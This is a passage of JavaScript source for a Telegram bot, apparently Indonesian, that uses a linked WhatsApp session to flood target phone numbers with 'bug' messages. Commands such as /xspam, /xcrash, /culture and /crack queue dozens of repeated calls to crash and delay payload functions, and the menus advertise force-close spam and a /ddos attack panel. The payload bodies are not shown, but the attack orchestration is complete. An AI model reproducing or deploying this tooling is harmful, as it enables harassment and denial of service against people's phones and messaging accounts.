      console.log(`Send Bug: ${i}/${lopers} → ${nomor} (${duration}s)`);
    } catch (err) {
      console.log(`Send Bug Gagal: ${i}/${lopers} → ${nomor} — ${err.message}`);
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`[Task ${taskId}] Selesai → ${nomor} dalam ${totalTime}s`);
}

async function DELLAY7(sock, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 800;
  const lopers = 45;
  const startTime = Date.now();
  const nomor = target.split('@')[0];

  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();
    try {
      await ObxDelayIosOrAndroid(sock, target);
      await sleep(1000);
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug: ${i}/${lopers} → ${nomor} (${duration}s)`);
    } catch (err) {
      console.log(`Send Bug Gagal: ${i}/${lopers} → ${nomor} — ${err.message}`);
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`[Task ${taskId}] Selesai → ${nomor} dalam ${totalTime}s`);
}

async function DELLAY8(sock, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 800;
  const lopers = 45;
  const startTime = Date.now();
  const nomor = target.split('@')[0];

  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();
    try {
      await tryingXsp(sock, target);
      await sleep(1000);
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug: ${i}/${lopers} → ${nomor} (${duration}s)`);
    } catch (err) {
      console.log(`Send Bug Gagal: ${i}/${lopers} → ${nomor} — ${err.message}`);
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`[Task ${taskId}] Selesai → ${nomor} dalam ${totalTime}s`);
}

async function DELLAY9(sock, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 800;
  const lopers = 45;
  const startTime = Date.now();
  const nomor = target.split('@')[0];

  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();
    try {
      await AstecKiyuru(sock, target);
      await sleep(1000);
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug: ${i}/${lopers} → ${nomor} (${duration}s)`);
    } catch (err) {
      console.log(`Send Bug Gagal: ${i}/${lopers} → ${nomor} — ${err.message}`);
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`[Task ${taskId}] Selesai → ${nomor} dalam ${totalTime}s`);
}

// ============================================================
// BUILD TASKS
// ============================================================
function buildDelayTasks(kind, target, loops, delayMs = 1000) {
  const fnMap = {
    DELLAY1: delayhard,
    DELLAY2: mbutnew,
    DELLAY3: xovaliaum,
    DELLAY4: iosdelay,
    DELLAY5: makluInvis,
  };
  const fn = fnMap[kind];
  if (!fn) throw new Error(`Unknown delay kind: ${kind}`);

  const tasks = [];
  for (let i = 0; i < loops; i++) {
    tasks.push(async () => {
      await fn(sock, target);
      if (i < loops - 1) await sleep(delayMs);
    });
  }
  return tasks;
}

function buildDelayTasksRR(kind, target, loops) {
  const fnMap = {
    DELLAY1: delayhard,
    DELLAY2: mbutnew,
    DELLAY3: xovaliaum,
    DELLAY4: iosdelay,
    DELLAY5: makluInvis,
    DELLAY6: syncdly,
    DELLAY7: ObxDelayIosOrAndroid,
    DELLAY8: tryingXsp,
    DELLAY9: AstecKiyuru,
  };
  const fn = fnMap[kind];
  if (!fn) throw new Error(`Unknown delay kind: ${kind}`);

  const tasks = [];
  for (let i = 0; i < loops; i++) {
    tasks.push(async () => {
      await fn(sock, target);
    });
  }
  return tasks;
}

function buildGrenTasks(target, loops, delayMs = 1000) {
  const tasks = [];
  for (let i = 0; i < loops; i++) {
    tasks.push(async () => {
      await GrenXx(sock, target);
      if (i < loops - 1) await sleep(delayMs);
    });
  }
  return tasks;
}

function buildOrtuTasks(target, loops, delayMs = 1000) {
  const tasks = [];
  for (let i = 0; i < loops; i++) {
    tasks.push(async () => {
      await ortulukemana(sock, target);
      if (i < loops - 1) await sleep(delayMs);
    });
  }
  return tasks;
}

// ============================================================
// FORMAT WAKTU
// ============================================================
function formatDateTime(date) {
  const hari = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
  const bulan = ['Januari','Februari','Maret','April','Mei','Juni',
                 'Juli','Agustus','September','Oktober','November','Desember'];
  const d = new Date(date);
  const namaHari = hari[d.getDay()];
  const tanggal = d.getDate();
  const namaBulan = bulan[d.getMonth()];
  const tahun = d.getFullYear();
  const jam = String(d.getHours()).padStart(2, '0');
  const menit = String(d.getMinutes()).padStart(2, '0');
  const detik = String(d.getSeconds()).padStart(2, '0');
  return `${namaHari}, ${tanggal} ${namaBulan} ${tahun} — ${jam}:${menit}:${detik}`;
}

function getRealTime() {
  const now = new Date();
  const hari = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
  const bulan = ['Januari','Februari','Maret','April','Mei','Juni',
                 'Juli','Agustus','September','Oktober','November','Desember'];
  const Hari = hari[now.getDay()];
  const tanggalnew = now.getDate();
  const Bulan = bulan[now.getMonth()];
  const tahunnew = now.getFullYear();
  return `${Hari}, ${tanggalnew} ${Bulan} ${tahunnew}`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

// ============================================================
// PRIVATE CHAT AUTO MUTE
// ============================================================
let autoMuteEnabled = true;
const MUTE_DURATION_MS = 2 * 60 * 1000;
const mutedUsers = new Map();

bot.command('privatemute', async (ctx) => {
  if (!ctx.from) return;
  const userId = ctx.from.id.toString();

  if (!isOwner(userId)) {
    return ctx.reply('⛔ Kamu tidak memiliki izin untuk menggunakan command ini.');
  }

  const arg = (ctx.message.text.split(' ')[1] || '').toLowerCase();

  if (arg === 'on') {
    autoMuteEnabled = true;
    return ctx.reply(
      `✅ *Auto-Mute Private Chat* telah *diaktifkan!*\n` +
      `Setiap user yang DM bot akan otomatis di-mute 2 menit.`,
      { parse_mode: 'Markdown' }
    );
  } else if (arg === 'off') {
    autoMuteEnabled = false;
    mutedUsers.clear();
    return ctx.reply(
      `🔕 *Auto-Mute Private Chat* telah *dinonaktifkan!*\n` +
      `Semua user telah dibebaskan dan bebas DM bot.`,
      { parse_mode: 'Markdown' }
    );
  } else {
    const status = autoMuteEnabled ? '🟢 *ON*' : '🔴 *OFF*';
    return ctx.reply(
      `ℹ️ Status Auto-Mute Private Chat: ${status}\n\n` +
      `Gunakan:\n` +
      `• \`/privatemute on\` — aktifkan\n` +
      `• \`/privatemute off\` — nonaktifkan`,
      { parse_mode: 'Markdown' }
    );
  }
});

bot.use(async (ctx, next) => {
  if (ctx.chat?.type !== 'private') return next();
  if (!ctx.from) return next();

  const text = ctx.message?.text || '';
  if (text.startsWith('/start') || text.startsWith('/privatemute')) return next();

  const user = ctx.from;
  const userId = user.id.toString();
  const username = user.username ? `@${user.username}` : `#${userId}`;
  const fullName = `${user.first_name || ''}${user.last_name ? ' ' + user.last_name : ''}`.trim();

  if (userId === OWNER_ID.toString()) return next();

  if (!autoMuteEnabled) return next();

  if (mutedUsers.has(userId)) {
    const unmuteTime = mutedUsers.get(userId);
    if (Date.now() < unmuteTime) {
      const sisaMs = unmuteTime - Date.now();
      const sisaMenit = Math.floor(sisaMs / 60000);
      const sisaDetik = Math.floor((sisaMs % 60000) / 1000);
      await ctx.reply(
        `⚠️ Kamu masih dalam status *mute*.\n` +
        `⏳ Sisa waktu: *${sisaMenit} menit ${sisaDetik} detik*`,
        { parse_mode: 'Markdown' }
      );
      return;
    } else {
      mutedUsers.delete(userId);
    }
  }

  const muteStart = new Date();
  const muteEnd = new Date(Date.now() + MUTE_DURATION_MS);
  mutedUsers.set(userId, muteEnd.getTime());

  const logMessage =
    `\`\`\`javascript\n` +
    `┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓\n` +
    `   >> PRIVATE CHAT DETECTED — AUTO MUTE <<\n` +
    `┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
    `╭───〔 𝐋𝐎𝐆 𝐈𝐍𝐅𝐎 〕───╮\n` +
    `│ ◈ USER     : ${username}\n` +
    `│ ◈ NAMA     : ${fullName}\n` +
    `│ ◈ USER ID  : ${userId}\n` +
    `│ ◈ MUTE    : 2 Menit\n` +
    `│ ◈ MULAI   : ${formatDateTime(muteStart)}\n` +
    `│ ◈ BEBAS   : ${formatDateTime(muteEnd)}\n` +
    `╰──────────────────────╯\n` +
    `\`\`\``;

  if (LOG_GROUP_ID) {
    try {
      await ctx.telegram.sendPhoto(LOG_GROUP_ID, MENU_PHOTO, {
        caption: logMessage,
        parse_mode: 'Markdown'
      });
    } catch (e) {
      console.error('Gagal kirim log ke group:', e.message);
    }
  }

  try {
    await ctx.telegram.sendPhoto(OWNER_ID, MENU_PHOTO, {
      caption: logMessage,
      parse_mode: 'Markdown'
    });
  } catch (e) {
    console.error('Gagal kirim log ke owner:', e.message);
  }

  await ctx.replyWithPhoto(MENU_PHOTO, {
    caption:
      `🚫 Kamu telah di-*mute* selama *2 menit* karena mengirim pesan ke private bot.\n\n` +
      `⏰ *Mulai* : ${formatDateTime(muteStart)}\n` +
      `✅ *Bebas* : ${formatDateTime(muteEnd)}`,
    parse_mode: 'Markdown'
  });

  return;
});

// ============================================================
// USER JOINED CHECK
// ============================================================
async function isUserJoined(ctx, userId) {
  try {
    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, userId);
    return ['member', 'administrator', 'creator'].includes(member.status);
  } catch (e) {
    return false;
  }
}

bot.action('check_join', async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from.id;
  const sudahJoin = await isUserJoined(ctx, userId);

  if (!sudahJoin) {
    await ctx.answerCbQuery('❌ Kamu belum join channel!', { show_alert: true });
    return;
  }

  await ctx.deleteMessage();

  const Name = ctx.from.username ? `@${ctx.from.username}` : ctx.from.id.toString();
  const waktu = getRealTime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";

  const mainMenuMessage = `\`\`\`javascript
( 🪼 ) R A F A E L ─═⊱
Привет Рафаэль готов помочь
Пожалуйста, используйте этого бота разумно и ответственно.
Наслаждайтесь.
──────────────────────────
creator : "@bronsew";
Version: " infinity ";
User   : "${Name}";
Date   : "${waktu}"
Status : "${waStatus}"
NOTE :JIKA BOT TIDAK MERESPON /restart ULANG!!! 
SC UPDATE OTOMATIS /update
\`\`\``;

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐒𝐄𝐓𝐓𝐈𝐍𝐆 𝐌𝐄𝐍𝐔", callback_data: "owner_menu", style: 'success' }],
        [{ text: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", callback_data: "bug_menu", style: 'primary' }],
        [{ text: "𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔", callback_data: "tools_menu", style: 'danger' }],
      ],
    },
  });
});

// ============================================================
// START COMMAND
// ============================================================
bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const Name = ctx.from.username ? `@${ctx.from.username}` : ctx.from.id.toString();
  const waktu = getRealTime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";

  const sudahJoin = await isUserJoined(ctx, userId);

  if (!sudahJoin) {
    const forceMsg = `\`\`\`javascript
╭───〔 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 〕───╮
│ ◈ USER   : ${Name}
│ ◈ STATUS : ❌ Belum Join
│
│  Silakan JOIN channel kami
│  terlebih dahulu sebelum
│  menggunakan bot ini!
╰──────────────────────╯
\`\`\``;

    return ctx.replyWithPhoto(MENU_PHOTO, {
      caption: forceMsg,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text:`「 📢 」 JOIN ${CHANNEL_USERNAME}`, url: `https://t.me/${CHANNEL_USERNAME.replace('@', '')}`, style: 'danger' }],
          [{ text: '「 ✅ 」 Verifikasi', callback_data: 'check_join', style: 'success' }],
        ],
      },
    });
  }

  const mainMenuMessage = `\`\`\`javascript
( 🪼 ) R A F A E L ─═⊱
Привет Рафаэль готов помочь
Пожалуйста, используйте этого бота разумно и ответственно.
Наслаждайтесь.
──────────────────────────
creator : "@bronsew";
Version: " infinity ";
User   : "${Name}";
Date   : "${waktu}"
Status : "${waStatus}"
NOTE :JIKA BOT TIDAK MERESPON /restart ULANG!!! 
SC UPDATE OTOMATIS /update
\`\`\``;

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐒𝐄𝐓𝐓𝐈𝐍𝐆 𝐌𝐄𝐍𝐔", callback_data: "owner_menu", style: 'success' }],
        [{ text: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", callback_data: "bug_menu", style: 'primary' }],
        [{ text: "𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔", callback_data: "tools_menu", style: 'danger' }],
      ],
    },
  });
});

// ============================================================
// MENU HANDLERS
// ============================================================
bot.action("owner_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const mainMenuMessage = `\`\`\`
╭━───━⊱ ⊱⪩ 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 ⪨⊰
┃❏ /addsender 62xxx
┃❏ /delsesi
┃❏ /addpremgroup <add all member>
┃❏ /delpremgroup <delete acces all memb>
┃❏ /addpremgroupid <ɪᴅ>
┃❏ /delpremgroupid
┃❏ /cekpremgroup
┃❏ /listpremgroup
┃❏ /blockcmd  <Block command bug>
┃❏ /unblockcmd <Unblock command bug>
┃❏ /listblockcmd <list command>
┃❏ /addadmin <ɪᴅ>
┃❏ /deladmin <ɪᴅ>
┃❏ /addprem <ɪᴅ>
┃❏ /delprem <ɪᴅ>
┃❏ /cekprem <ᴄᴇᴋ>
┃❏ /setcd 
┃❏ /addpromo 
┃❏ /delpromo
┃❏ /antipromo on/off
┃❏ /listpromo 
┃❏ /privatemute on/off
╰━───────────────━❏\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: 'Primary' }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("tools_menu", async (ctx) => {
  const mainMenuMessage = `\`\`\`
╭━───━⊱ ⊱⪩ 𝚃𝙾𝙾𝙻𝚂 𝙼𝙴𝙽𝚄 ⪨⊰
┃❏ /brat <Brat to sticker>
┃❏ /tiktokdl <TikTok downloader>
┃❏ /iqc <iPhone camera effect.>
┃❏ /info <cekid.>
┃❏ /kalkulator <Kalkulator tools>
┃❏ /bandgb <Band group WhatsApp.>
┃❏ /ddos <Attack panel.>
┃❏ /approved <-100xxxxxxxxxx.>
┃❏ /unapproved <-100xxxxxxxxxx.>
┃❏ /version <versi terbaru sc>
┃❏ /update <update versi terbaru>
┃❏ /restart <restart panel>
┃❏ /rest on/off <mode istirahat>
╰━─────────────────━❏
\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: 'Primary' }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

// ============================================================
// BUG MENU — DENGAN TANDA ✅/❌ DI UJUNG COMMAND
// ============================================================
bot.action("bug_menu", async (ctx) => {
  const mainMenuMessage = `\`\`\`
┃━━━【 DELLAY SPAM 】━━━
┃╰┈➤ /xspam 62xx${getCmdStatus('xspam')}
┃  
┃╰┈➤ /xcrash 62xx${getCmdStatus('xcrash')}
┃   
┃╰┈➤ /culturelag 62xx${getCmdStatus('culturelag')}
┃
┃━━━【 FC SPAM 】━━━
┃╰┈➤ /forcex 62xx${getCmdStatus('forcex')}
┃
┃╰┈➤ /payload 62xx${getCmdStatus('payload')}
┃
┃━━━【 IOS MAYBE 】━━━
┃╰┈➤ /xios1 62xx${getCmdStatus('culturelag')}
┃
┃╰┈➤ /xios2 62xx${getCmdStatus('culturelag')}
┃
┃╰┈➤ /xios3 62xx${getCmdStatus('culturelag')}
┃
╰━━━━━━━━━━━━━━━༉‧.
━━━【INFO!!】━━━
𝗡𝗯 : BEBAS SPAM 
𝗖𝗲𝗸 𝗮𝗻𝘁𝗿𝗶𝗮𝗻 : /queue
\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: "primary" },
        { text: "➡️ ", callback_data: "bug_menu2", style: "success" }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});

bot.action("bug_menu2", async (ctx) => {
  const mainMenuMessage = `\`\`\`
╭━━━〔 SPAM BUG 〕━━━╮
│━━━━FORCE CLOSE HARD ➤
│╰┈➤ /culture  628xxxx${getCmdStatus('fxcperma')}
┃
│╰┈➤ /crack  628xxxx${getCmdStatus('crack')}
┃
│╰┈➤ /lages  628xxxx${getCmdStatus('lages')}
┃
│╰┈➤ /zras  628xxxx${getCmdStatus('zras')}
┃
╰━━━━━━━━━━━━━━━━━━━━━\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: "primary" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});

bot.action("back", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : ctx.from.id.toString();
  const waktu = getRealTime();
  const waStatus = sock && sock.user ? "✔️" : "❌ ";
      
  const mainMenuMessage = `\`\`\`javascript
( 🪼 ) R A F A E L ─═⊱
Привет Рафаэль готов помочь
Пожалуйста, используйте этого бота разумно и ответственно.
Наслаждайтесь.
──────────────────────────
creator : "@bronsew";
Version: " infinity ";
User   : "${Name}";
Date   : "${waktu}"
Status : "${waStatus}"
NOTE :JIKA BOT TIDAK MERESPON /restart ULANG!!! 
SC UPDATE OTOMATIS /update
\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const mainKeyboard = [
    [{ text: "𝐒𝐄𝐓𝐓𝐈𝐍𝐆 𝐌𝐄𝐍𝐔", callback_data: "owner_menu", style: 'success' }],
    [{ text: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", callback_data: "bug_menu", style: 'primary' }],
    [{ text: "𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔", callback_data: "tools_menu", style: 'danger' }],
  ];
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

// ============================================================
// COMMANDS: QUEUE
// ============================================================
bot.command("queue", async (ctx) => {
  const s = sendQueue.snapshot();

  if (s.users === 0) {
    return ctx.reply(
      `📭 *Antrian kosong*\n\n` +
      `Tidak ada user yang sedang bug.\n` +
      `👥 Max user: *${s.maxUsers}*`,
      { parse_mode: 'Markdown' }
    );
  }

  let list = '';
  for (const item of s.list) {
    const marker = item.isCurrent ? '▶️' : '  ';
    const shortId = String(item.userId).slice(-4);
    list += `${marker} *${item.no}.* \`...${shortId}\` | ${item.tasks} task | /${item.cmd}\n`;
  }

  await ctx.reply(
    `╭━━━〔 📋 *ROUND-ROBIN QUEUE* 〕━━━╮\n` +
    `│ 👥 User aktif : *${s.users}/${s.maxUsers}*\n` +
    `│ 📦 Total task : *${s.totalTasks}*\n` +
    `│ ⏱️ Tick delay : *${s.tickDelay}ms*\n` +
    `│ ⏳ Elapsed    : *${s.elapsed}s*\n` +
    `╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n` +
    `*Daftar giliran:*\n${list}\n` +
    `_▶️ = giliran saat ini_`,
    { parse_mode: 'Markdown' }
  );
});

// ============================================================
// COMMANDS: TOOLS
// ============================================================
bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    ctx.reply("❌ Gagal membuat stiker brat.");
  }
});

bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

const formatUserInfo = (user, chat) => {
  const lines = [
    `👤 *Info User*`,
    ``,
    `🆔 *User ID:* \`${user.id}\``,
    `👤 *Nama:* ${user.first_name}${user.last_name ? " " + user.last_name : ""}`,
    `🔖 *Username:* ${user.username ? "@" + user.username : "_(tidak ada)_"}`,
    `🤖 *Bot:* ${user.is_bot ? "Ya" : "Tidak"}`,
    `🌐 *Bahasa:* ${user.language_code || "_(tidak diketahui)_"}`,
    ``,
    `💬 *Info Chat*`,
    ``,
    `🆔 *Chat ID:* \`${chat.id}\``,
    `📌 *Tipe Chat:* ${chat.type}`,
  ];

  if (chat.title) lines.push(`📛 *Judul Grup:* ${chat.title}`);
  if (chat.username) lines.push(`🔖 *Username Grup:* @${chat.username}`);

  return lines.join("\n");
};

bot.command("info", (ctx) => {
  ctx.replyWithMarkdown(formatUserInfo(ctx.from, ctx.chat));
});

bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply("❌ Format: /iqc 18:00|40|Indosat|SennJmbud");
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply("❌ Format: /iqc 18:00|40|Indosat|hai hai`");
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Senn Offc ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command('kalkulator', (ctx) => {
    const input = ctx.message.text.split(' ').slice(1).join(' ');
    
    if (!input) {
        return ctx.reply('⚠️ Masukkan angkanya Fi! Contoh: /kalkulator 5 x 5');
    }

    try {
        let formatMath = input
            .replace(/x/gi, '*')
            .replace(/:/g, '/')
            .replace(/,/g, '.');

        if (/[^0-9\+\-\*\/\(\)\. ]/g.test(formatMath)) {
            return ctx.reply('❌ Karakter tidak valid! Cuma bisa angka dan simbol + - x :');
        }

        const hasil = eval(formatMath);
        ctx.reply(`📊 *Hasil Perhitungan:*\n\n${input} = *${hasil}*`, { parse_mode: 'Markdown' });
    } catch (err) {
        ctx.reply('❌ Format salah! Pastiin angkanya bener ya. Contoh: /kalkulator 10 x 2');
    }
});

// ============================================================
// COMMANDS: BUG — MODE ROUND-ROBIN TANPA JEDA
// ============================================================
bot.command("xspam", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const userId = ctx.from.id.toString();

  const tasks = buildDelayTasksRR('DELLAY1', target, 48);

  let info;
  try {
    info = sendQueue.addBatch(userId, tasks, { cmd: 'xspam', target: q });
  } catch (err) {
    return ctx.reply(`⚠️ *Gagal masuk antrian*\n\n${err.message}`, { parse_mode: 'Markdown' });
  }

  await showLoadingAnimation(ctx, target, info);
});

bot.command("xcrash", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xcrash 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const userId = ctx.from.id.toString();

  const tasks = buildDelayTasksRR('DELLAY3', target, 48);

  let info;
  try {
    info = sendQueue.addBatch(userId, tasks, { cmd: 'xcrash', target: q });
  } catch (err) {
    return ctx.reply(`⚠️ *Gagal masuk antrian*\n\n${err.message}`, { parse_mode: 'Markdown' });
  }

  await showLoadingAnimation(ctx, target, info);
});

bot.command("culturelag", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /culturelag 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const userId = ctx.from.id.toString();

  const tasks = buildDelayTasksRR('DELLAY5', target, 48);

  let info;
  try {
    info = sendQueue.addBatch(userId, tasks, { cmd: 'culturelag', target: q });
  } catch (err) {
    return ctx.reply(`⚠️ *Gagal masuk antrian*\n\n${err.message}`, { parse_mode: 'Markdown' });
  }

  await showLoadingAnimation(ctx, target, info);
});

bot.command("culture", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /culturelag 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const userId = ctx.from.id.toString();

  const tasks = buildDelayTasksRR('DELLAY6', target, 48);

  let info;
  try {
    info = sendQueue.addBatch(userId, tasks, { cmd: 'culture', target: q });
  } catch (err) {
    return ctx.reply(`⚠️ *Gagal masuk antrian*\n\n${err.message}`, { parse_mode: 'Markdown' });
  }

  await showLoadingAnimation(ctx, target, info);
});

bot.command("crack", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
